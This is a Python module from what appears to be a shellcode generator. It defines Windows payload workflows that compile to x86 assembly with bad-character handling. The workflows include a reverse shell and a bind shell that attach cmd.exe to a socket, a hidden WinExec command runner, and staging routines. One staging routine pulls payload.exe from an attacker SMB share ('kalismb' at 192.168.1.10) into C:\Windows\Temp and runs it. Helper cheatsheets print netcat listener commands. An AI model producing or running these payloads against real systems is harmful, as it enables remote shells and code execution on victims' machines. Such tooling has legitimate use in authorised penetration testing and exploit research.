"""Reference workflows and the WorkflowTemplate adapter.

WorkflowTemplate bridges the Workflow IR into the existing build pipeline
by implementing the PayloadTemplate interface.  It extracts manifest
requirements (APIs, strings, structs, locals) from the IR and delegates
payload assembly generation to the x86 backend.

Reference workflows:
  - run_command: WinExec + ExitProcess with branch on result
  - reverse_shell: WSAStartup, WSASocketA, connect, CreateProcessA
    with typed inputs (lhost, lport), struct init, and error branching
  - bind_shell: WSAStartup, WSASocketA, bind, listen, accept,
    CreateProcessA with typed lport, struct init, and error branching
  - copy_file: CopyFileA with configurable source and dest paths
  - copy_then_run: CopyFileA followed by WinExec
  - move_then_run: MoveFileA followed by WinExec
  - check_path: GetFileAttributesA to test file existence
"""
from __future__ import annotations

import socket as _socket
import struct as _struct
from collections.abc import Callable

from ..payload_templates.base import PayloadTemplate, TemplateConfig
from ..stack_alloc import StackLayout
from .ir import (
    AddressOf,
    AllocateLocal,
    AllocateStruct,
    Block,
    CallAPI,
    Compare,
    ConstructString,
    DefineConstant,
    ExitStrategy,
    Immediate,
    Jump,
    NameRef,
    SuccessPredicate,
    Terminate,
    TerminateStyle,
    ValueRef,
    Workflow,
    WriteStructField,
    ZeroStruct,
)
from .validator import validate
from .x86_backend import lower_workflow

# GetCurrentProcess() returns the pseudo-handle (HANDLE)-1 = 0xFFFFFFFF.
# We use the well-known constant directly to avoid an extra API resolution.
_CURRENT_PROCESS_HANDLE = 0xFFFFFFFF


def _make_exit_blocks(
    strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> tuple[Block, Block]:
    """Build reusable success/fail terminal blocks for the given exit strategy.

    EXIT_PROCESS:      ExitProcess(0) / ExitProcess(1)
    TERMINATE_PROCESS: TerminateProcess(GetCurrentProcess(), 0/1)
    THREAD_ONLY:       just hang (no process exit, useful for injected threads)
    """
    if strategy == ExitStrategy.EXIT_PROCESS:
        return (
            Block("success", (
                CallAPI("ExitProcess", arguments=(Immediate(0),)),
                Terminate(TerminateStyle.HANG),
            )),
            Block("fail", (
                CallAPI("ExitProcess", arguments=(Immediate(1),)),
                Terminate(TerminateStyle.HANG),
            )),
        )

    if strategy == ExitStrategy.TERMINATE_PROCESS:
        return (
            Block("success", (
                CallAPI(
                    "TerminateProcess",
                    arguments=(
                        Immediate(_CURRENT_PROCESS_HANDLE),
                        Immediate(0),
                    ),
                ),
                Terminate(TerminateStyle.HANG),
            )),
            Block("fail", (
                CallAPI(
                    "TerminateProcess",
                    arguments=(
                        Immediate(_CURRENT_PROCESS_HANDLE),
                        Immediate(1),
                    ),
                ),
                Terminate(TerminateStyle.HANG),
            )),
        )

    # THREAD_ONLY: no process termination
    return (
        Block("success", (
            Terminate(TerminateStyle.HANG),
        )),
        Block("fail", (
            Terminate(TerminateStyle.HANG),
        )),
    )


def _exit_api_name(strategy: ExitStrategy) -> str | None:
    """Return the API name the exit strategy requires, or None."""
    if strategy == ExitStrategy.EXIT_PROCESS:
        return "ExitProcess"
    if strategy == ExitStrategy.TERMINATE_PROCESS:
        return "TerminateProcess"
    return None


def _parse_exit_strategy(value: str) -> ExitStrategy:
    """Convert a config string to ExitStrategy enum."""
    try:
        return ExitStrategy(value)
    except ValueError:
        return ExitStrategy.EXIT_PROCESS


class WorkflowTemplate(PayloadTemplate):
    """Adapter that bridges a Workflow IR into the PayloadTemplate interface."""

    def __init__(self, workflow: Workflow) -> None:
        result = validate(workflow)
        if not result.valid:
            raise ValueError(
                "Workflow validation failed:\n"
                + "\n".join(f"  - {e}" for e in result.errors)
            )
        self._workflow = workflow

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        """Return the workflow to use for a given config.

        Subclasses that rebuild the workflow (e.g. for exit strategy)
        override this. The base implementation returns the static workflow.
        """
        return self._workflow

    def emit(self, layout: StackLayout, config: TemplateConfig) -> str:
        return lower_workflow(
            self._resolve_workflow(config), layout, config.badchars, config,
        )

    def _extract_slots(self, workflow: Workflow) -> list[str]:
        """Extract all slot names from a workflow's IR operations."""
        seen: set[str] = set()
        ordered: list[str] = []

        def _add(name: str) -> None:
            if name not in seen:
                seen.add(name)
                ordered.append(name)

        for block in workflow.blocks:
            for op in block.operations:
                if isinstance(op, CallAPI):
                    _add(op.api_name)
                    if op.result is not None:
                        _add(op.result)
                    for arg in op.arguments:
                        self._collect_value_refs(arg, _add)

                elif isinstance(op, ConstructString):
                    _add(op.name)

                elif isinstance(op, AllocateLocal):
                    _add(op.name)

                elif isinstance(op, AllocateStruct):
                    _add(op.struct_type)

                elif isinstance(op, Compare):
                    _add(op.value)

                elif isinstance(op, (DefineConstant,)):
                    pass

        return ordered

    def probe_slots(self, config: TemplateConfig) -> list[str]:
        """Extract all slot names the workflow needs from the IR directly."""
        return self._extract_slots(self._resolve_workflow(config))

    def probe_strings(self, config: TemplateConfig | None = None) -> dict[str, str]:
        """Return {label: value} for all ConstructString operations in the IR."""
        wf = self._resolve_workflow(config or TemplateConfig())
        result: dict[str, str] = {}
        for block in wf.blocks:
            for op in block.operations:
                if isinstance(op, ConstructString):
                    result[op.name] = op.value
        return result

    def probe_structs(self, config: TemplateConfig | None = None) -> dict[str, str]:
        """Return {name: struct_type} for all AllocateStruct operations."""
        wf = self._resolve_workflow(config or TemplateConfig())
        result: dict[str, str] = {}
        for block in wf.blocks:
            for op in block.operations:
                if isinstance(op, AllocateStruct):
                    result[op.name] = op.struct_type
        return result

    @staticmethod
    def _collect_value_refs(ref: ValueRef, add_fn: Callable[[str], None]) -> None:
        if isinstance(ref, NameRef):
            add_fn(ref.name)
        elif isinstance(ref, AddressOf):
            add_fn(ref.name)

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return []


# ---------------------------------------------------------------------------
# Reference workflow builders
# ---------------------------------------------------------------------------


def build_run_command_workflow(
    command: str = "calc.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the run_command reference workflow.

    WinExec(command, SW_HIDE=0) -> branch on result -> exit
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_run_command",
        blocks=(
            Block("entry", (
                ConstructString("cmd", command),
                CallAPI(
                    "WinExec",
                    arguments=(AddressOf("cmd"), Immediate(0)),
                    result="wexec_result",
                ),
                Compare(
                    "wexec_result",
                    SuccessPredicate.NONZERO,
                    true_block="success",
                    false_block="fail",
                ),
            )),
            success,
            fail,
        ),
        entry="entry",
    )


class IRRunCommandTemplate(WorkflowTemplate):
    """IR-backed run_command template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_run_command_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        command = config.command or "calc.exe"
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_run_command_workflow(command, exit_strategy=strategy)

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Command executed on target", config.command or "calc.exe"),
        ]


# ---------------------------------------------------------------------------
# Reverse shell workflow
# ---------------------------------------------------------------------------

# STARTF_USESTDHANDLES tells CreateProcessA to use the hStdInput/Output/Error
# fields from STARTUPINFOA rather than inheriting the parent's console.
_STARTF_USESTDHANDLES = 0x00000100


def build_reverse_shell_workflow(
    lhost: str = "127.0.0.1",
    lport: int = 4444,
    command: str = "cmd.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the reverse_shell reference workflow.

    WSAStartup -> WSASocketA -> populate sockaddr_in -> connect ->
    populate STARTUPINFOA -> CreateProcessA -> ExitProcess

    The port and IP are pre-computed to network byte order and embedded
    as DefineConstant nodes, keeping the IR free of byte-order logic.
    """
    port_be = _socket.htons(lport)
    ip_le = _struct.unpack("<I", _socket.inet_aton(lhost))[0]

    return Workflow(
        name="ir_reverse_shell",
        blocks=(
            Block("entry", (
                # Pre-compute network byte order values
                DefineConstant("sin_port_be", port_be),
                DefineConstant("sin_addr_le", ip_le),
                DefineConstant("af_inet", 2),

                # Allocate structures
                AllocateStruct("wsadata", "WSADATA"),
                AllocateStruct("sa", "sockaddr_in"),
                AllocateStruct("si", "STARTUPINFOA"),
                AllocateStruct("pi", "PROCESS_INFORMATION"),

                # Allocate string
                ConstructString("cmd", command),

                # Initialize Winsock
                CallAPI(
                    "WSAStartup",
                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
                    result="wsa_ret",
                ),
                Compare("wsa_ret", SuccessPredicate.ZERO,
                        true_block="create_socket", false_block="fail"),
            )),

            Block("create_socket", (
                # WSASocketA(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6, NULL, 0, 0)
                CallAPI(
                    "WSASocketA",
                    arguments=(
                        Immediate(2),    # AF_INET
                        Immediate(1),    # SOCK_STREAM
                        Immediate(6),    # IPPROTO_TCP
                        Immediate(0),    # lpProtocolInfo = NULL
                        Immediate(0),    # g = 0
                        Immediate(0),    # dwFlags = 0
                    ),
                    result="socket_handle",
                ),
                Compare("socket_handle", SuccessPredicate.INVALID_HANDLE,
                        true_block="connect_socket", false_block="fail"),
            )),

            Block("connect_socket", (
                # Populate sockaddr_in
                ZeroStruct("sa"),
                WriteStructField("sa", "sin_family", NameRef("af_inet")),
                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
                WriteStructField("sa", "sin_addr", NameRef("sin_addr_le")),

                # connect(socket, &sockaddr_in, 0x10)
                CallAPI(
                    "connect",
                    arguments=(
                        NameRef("socket_handle"),
                        AddressOf("sa"),
                        Immediate(0x10),
                    ),
                    result="conn_ret",
                ),
                Compare("conn_ret", SuccessPredicate.ZERO,
                        true_block="setup_process", false_block="fail"),
            )),

            Block("setup_process", (
                # Zero and populate STARTUPINFOA
                ZeroStruct("si"),
                WriteStructField("si", "cb", Immediate(0x44)),
                WriteStructField("si", "dwFlags",
                                 Immediate(_STARTF_USESTDHANDLES)),
                WriteStructField("si", "hStdInput",
                                 NameRef("socket_handle")),
                WriteStructField("si", "hStdOutput",
                                 NameRef("socket_handle")),
                WriteStructField("si", "hStdError",
                                 NameRef("socket_handle")),

                # Zero PROCESS_INFORMATION
                ZeroStruct("pi"),

                # CreateProcessA(NULL, &cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)
                CallAPI(
                    "CreateProcessA",
                    arguments=(
                        Immediate(0),       # lpApplicationName = NULL
                        AddressOf("cmd"),   # lpCommandLine
                        Immediate(0),       # lpProcessAttributes = NULL
                        Immediate(0),       # lpThreadAttributes = NULL
                        Immediate(1),       # bInheritHandles = TRUE
                        Immediate(0),       # dwCreationFlags = 0
                        Immediate(0),       # lpEnvironment = NULL
                        Immediate(0),       # lpCurrentDirectory = NULL
                        AddressOf("si"),    # lpStartupInfo
                        AddressOf("pi"),    # lpProcessInformation
                    ),
                    result="cpa_ret",
                ),
                Compare("cpa_ret", SuccessPredicate.NONZERO,
                        true_block="success", false_block="fail"),
            )),

            *_make_exit_blocks(exit_strategy),
        ),
        entry="entry",
    )


class IRReverseShellTemplate(WorkflowTemplate):
    """IR-backed reverse_shell template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_reverse_shell_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_reverse_shell_workflow(
            lhost=config.lhost,
            lport=config.lport,
            command=config.command or "cmd.exe",
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Start netcat listener", f"nc -lnvp {config.lport}"),
            ("Start listener (rlwrap)", f"rlwrap nc -lnvp {config.lport}"),
        ]


# ---------------------------------------------------------------------------
# Bind shell workflow
# ---------------------------------------------------------------------------

_INADDR_ANY = 0  # 0.0.0.0


def build_bind_shell_workflow(
    lport: int = 4444,
    command: str = "cmd.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the bind_shell reference workflow.

    WSAStartup -> WSASocketA -> bind -> listen -> accept ->
    populate STARTUPINFOA (stdio = accepted socket) -> CreateProcessA ->
    ExitProcess

    The port is pre-computed to network byte order. The bind address is
    INADDR_ANY (0.0.0.0) so the shell listens on all interfaces.
    """
    port_be = _socket.htons(lport)

    return Workflow(
        name="ir_bind_shell",
        blocks=(
            Block("entry", (
                DefineConstant("sin_port_be", port_be),
                DefineConstant("af_inet", 2),
                DefineConstant("inaddr_any", _INADDR_ANY),

                AllocateStruct("wsadata", "WSADATA"),
                AllocateStruct("sa", "sockaddr_in"),
                AllocateStruct("si", "STARTUPINFOA"),
                AllocateStruct("pi", "PROCESS_INFORMATION"),

                ConstructString("cmd", command),

                CallAPI(
                    "WSAStartup",
                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
                    result="wsa_ret",
                ),
                Compare("wsa_ret", SuccessPredicate.ZERO,
                        true_block="create_socket", false_block="fail"),
            )),

            Block("create_socket", (
                CallAPI(
                    "WSASocketA",
                    arguments=(
                        Immediate(2),    # AF_INET
                        Immediate(1),    # SOCK_STREAM
                        Immediate(6),    # IPPROTO_TCP
                        Immediate(0),    # lpProtocolInfo = NULL
                        Immediate(0),    # g = 0
                        Immediate(0),    # dwFlags = 0
                    ),
                    result="listen_socket",
                ),
                Compare("listen_socket", SuccessPredicate.INVALID_HANDLE,
                        true_block="bind_socket", false_block="fail"),
            )),

            Block("bind_socket", (
                ZeroStruct("sa"),
                WriteStructField("sa", "sin_family", NameRef("af_inet")),
                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
                WriteStructField("sa", "sin_addr", NameRef("inaddr_any")),

                CallAPI(
                    "bind",
                    arguments=(
                        NameRef("listen_socket"),
                        AddressOf("sa"),
                        Immediate(0x10),
                    ),
                    result="bind_ret",
                ),
                Compare("bind_ret", SuccessPredicate.ZERO,
                        true_block="listen_socket_block", false_block="fail"),
            )),

            Block("listen_socket_block", (
                CallAPI(
                    "listen",
                    arguments=(
                        NameRef("listen_socket"),
                        Immediate(1),   # backlog = 1
                    ),
                    result="listen_ret",
                ),
                Compare("listen_ret", SuccessPredicate.ZERO,
                        true_block="accept_conn", false_block="fail"),
            )),

            Block("accept_conn", (
                CallAPI(
                    "accept",
                    arguments=(
                        NameRef("listen_socket"),
                        Immediate(0),   # addr = NULL
                        Immediate(0),   # addrlen = NULL
                    ),
                    result="client_socket",
                ),
                Compare("client_socket", SuccessPredicate.INVALID_HANDLE,
                        true_block="setup_process", false_block="fail"),
            )),

            Block("setup_process", (
                ZeroStruct("si"),
                WriteStructField("si", "cb", Immediate(0x44)),
                WriteStructField("si", "dwFlags",
                                 Immediate(_STARTF_USESTDHANDLES)),
                WriteStructField("si", "hStdInput",
                                 NameRef("client_socket")),
                WriteStructField("si", "hStdOutput",
                                 NameRef("client_socket")),
                WriteStructField("si", "hStdError",
                                 NameRef("client_socket")),

                ZeroStruct("pi"),

                CallAPI(
                    "CreateProcessA",
                    arguments=(
                        Immediate(0),       # lpApplicationName = NULL
                        AddressOf("cmd"),   # lpCommandLine
                        Immediate(0),       # lpProcessAttributes = NULL
                        Immediate(0),       # lpThreadAttributes = NULL
                        Immediate(1),       # bInheritHandles = TRUE
                        Immediate(0),       # dwCreationFlags = 0
                        Immediate(0),       # lpEnvironment = NULL
                        Immediate(0),       # lpCurrentDirectory = NULL
                        AddressOf("si"),    # lpStartupInfo
                        AddressOf("pi"),    # lpProcessInformation
                    ),
                    result="cpa_ret",
                ),
                Compare("cpa_ret", SuccessPredicate.NONZERO,
                        true_block="success", false_block="fail"),
            )),

            *_make_exit_blocks(exit_strategy),
        ),
        entry="entry",
    )


class IRBindShellTemplate(WorkflowTemplate):
    """IR-backed bind_shell template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_bind_shell_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_bind_shell_workflow(
            lport=config.lport,
            command=config.command or "cmd.exe",
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Connect to bind shell", f"nc -nv <TARGET_IP> {config.lport}"),
            ("Connect (rlwrap)", f"rlwrap nc -nv <TARGET_IP> {config.lport}"),
        ]


# ---------------------------------------------------------------------------
# Copy file workflow
# ---------------------------------------------------------------------------


def build_copy_file_workflow(
    src_path: str = r"C:\source.txt",
    dst_path: str = r"C:\dest.txt",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the copy_file reference workflow.

    CopyFileA(src, dst, FALSE) -> branch on result -> exit
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_copy_file",
        blocks=(
            Block("entry", (
                ConstructString("src_path", src_path),
                ConstructString("dst_path", dst_path),
                CallAPI(
                    "CopyFileA",
                    arguments=(
                        AddressOf("src_path"),
                        AddressOf("dst_path"),
                        Immediate(0),  # bFailIfExists = FALSE
                    ),
                    result="copy_ret",
                ),
                Compare(
                    "copy_ret",
                    SuccessPredicate.NONZERO,
                    true_block="success",
                    false_block="fail",
                ),
            )),
            success,
            fail,
        ),
        entry="entry",
    )


class IRCopyFileTemplate(WorkflowTemplate):
    """IR-backed copy_file template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_copy_file_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_copy_file_workflow(
            src_path=config.src_path or r"C:\source.txt",
            dst_path=config.dst_path or r"C:\dest.txt",
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Source path", config.src_path or r"C:\source.txt"),
            ("Destination path", config.dst_path or r"C:\dest.txt"),
        ]


# ---------------------------------------------------------------------------
# Copy then run workflow
# ---------------------------------------------------------------------------


def build_copy_then_run_workflow(
    src_path: str = r"C:\source\payload.exe",
    dst_path: str = r"C:\Windows\Temp\payload.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the copy_then_run reference workflow.

    CopyFileA(src, dst, FALSE) -> WinExec(dst, SW_HIDE) -> exit

    dst_path is both the copy destination and the command line.
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_copy_then_run",
        blocks=(
            Block("entry", (
                ConstructString("src_path", src_path),
                ConstructString("dst_path", dst_path),
                CallAPI(
                    "CopyFileA",
                    arguments=(
                        AddressOf("src_path"),
                        AddressOf("dst_path"),
                        Immediate(0),  # bFailIfExists = FALSE
                    ),
                    result="copy_ret",
                ),
                Compare(
                    "copy_ret",
                    SuccessPredicate.NONZERO,
                    true_block="run_payload",
                    false_block="fail",
                ),
            )),
            Block("run_payload", (
                CallAPI(
                    "WinExec",
                    arguments=(AddressOf("dst_path"), Immediate(0)),
                    result="exec_ret",
                ),
                Compare(
                    "exec_ret",
                    SuccessPredicate.NONZERO,
                    true_block="success",
                    false_block="fail",
                ),
            )),
            success,
            fail,
        ),
        entry="entry",
    )


class IRCopyThenRunTemplate(WorkflowTemplate):
    """IR-backed copy_then_run template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_copy_then_run_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_copy_then_run_workflow(
            src_path=config.src_path or r"C:\source\payload.exe",
            dst_path=config.dst_path or r"C:\Windows\Temp\payload.exe",
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Source path", config.src_path or r"C:\source\payload.exe"),
            ("Destination path (also executed)",
             config.dst_path or r"C:\Windows\Temp\payload.exe"),
        ]


# ---------------------------------------------------------------------------
# Move then run workflow
# ---------------------------------------------------------------------------


def build_move_then_run_workflow(
    src_path: str = r"\\192.168.1.10\kalismb\payload.exe",
    dst_path: str = r"C:\Windows\Temp\payload.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the move_then_run reference workflow.

    MoveFileA(src, dst) -> WinExec(dst, SW_HIDE) -> exit

    dst_path is both the move destination and the command line.
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_move_then_run",
        blocks=(
            Block("entry", (
                ConstructString("src_path", src_path),
                ConstructString("dst_path", dst_path),
                CallAPI(
                    "MoveFileA",
                    arguments=(
                        AddressOf("src_path"),
                        AddressOf("dst_path"),
                    ),
                    result="move_ret",
                ),
                Compare(
                    "move_ret",
                    SuccessPredicate.NONZERO,
                    true_block="run_payload",
                    false_block="fail",
                ),
            )),
            Block("run_payload", (
                CallAPI(
                    "WinExec",
                    arguments=(AddressOf("dst_path"), Immediate(0)),
                    result="exec_ret",
                ),
                Compare(
                    "exec_ret",
                    SuccessPredicate.NONZERO,
                    true_block="success",
                    false_block="fail",
                ),
            )),
            success,
            fail,
        ),
        entry="entry",
    )


class IRMoveThenRunTemplate(WorkflowTemplate):
    """IR-backed move_then_run template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_move_then_run_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        return build_move_then_run_workflow(
            src_path=config.src_path or r"\\192.168.1.10\kalismb\payload.exe",
            dst_path=config.dst_path or r"C:\Windows\Temp\payload.exe",
            exit_strategy=strategy,
        )

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Source path (moved, not copied)",
             config.src_path or r"\\192.168.1.10\kalismb\payload.exe"),
            ("Destination path (also executed)",
             config.dst_path or r"C:\Windows\Temp\payload.exe"),
        ]


# ---------------------------------------------------------------------------
# Check path workflow
# ---------------------------------------------------------------------------


def build_check_path_workflow(
    check_path: str = r"C:\Windows\System32\cmd.exe",
    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
) -> Workflow:
    """Build the check_path reference workflow.

    GetFileAttributesA(path) -> branch on INVALID_FILE_ATTRIBUTES -> exit

    Success (file exists) exits with code 0, failure with code 1.
    """
    success, fail = _make_exit_blocks(exit_strategy)
    return Workflow(
        name="ir_check_path",
        blocks=(
            Block("entry", (
                ConstructString("check_path", check_path),
                CallAPI(
                    "GetFileAttributesA",
                    arguments=(AddressOf("check_path"),),
                    result="path_attrs",
                ),
                Compare(
                    "path_attrs",
                    SuccessPredicate.INVALID_HANDLE,
                    true_block="success",
                    false_block="fail",
                ),
            )),
            success,
            fail,
        ),
        entry="entry",
    )


class IRCheckPathTemplate(WorkflowTemplate):
    """IR-backed check_path template for CLI integration."""

    def __init__(self) -> None:
        super().__init__(build_check_path_workflow())

    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
        strategy = _parse_exit_strategy(config.exit_strategy)
        path = config.dst_path or r"C:\Windows\System32\cmd.exe"
        return build_check_path_workflow(path, exit_strategy=strategy)

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        path = config.dst_path or r"C:\Windows\System32\cmd.exe"
        return [
            ("Path checked", path),
            ("Exit code 0 if path exists", ""),
            ("Exit code 1 if path missing", ""),
        ]
